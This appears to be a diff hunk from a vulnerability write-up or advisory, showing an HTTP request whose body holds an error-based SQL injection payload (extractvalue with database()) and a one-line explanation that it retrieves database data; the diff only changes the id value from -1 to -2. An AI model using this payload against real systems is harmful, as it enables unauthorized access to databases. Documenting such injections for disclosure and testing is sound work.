@@ -78,14 +78,14 @@ Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=fvkkm43h4pnc6r6khno620js83
 Connection: close
 
-id=-1 OR extractvalue(1,concat(0x7e,database())) --
+id=-2 OR extractvalue(1,concat(0x7e,database())) --
 ```
 
 ### **Explanation:**  
 This payload injects the SQL command:  
 
 ```sql
-id=-1 OR extractvalue(1,concat(0x7e,database())) --
+id=-2 OR extractvalue(1,concat(0x7e,database())) --
 ```
 This makes it possible to get data from the database.
 
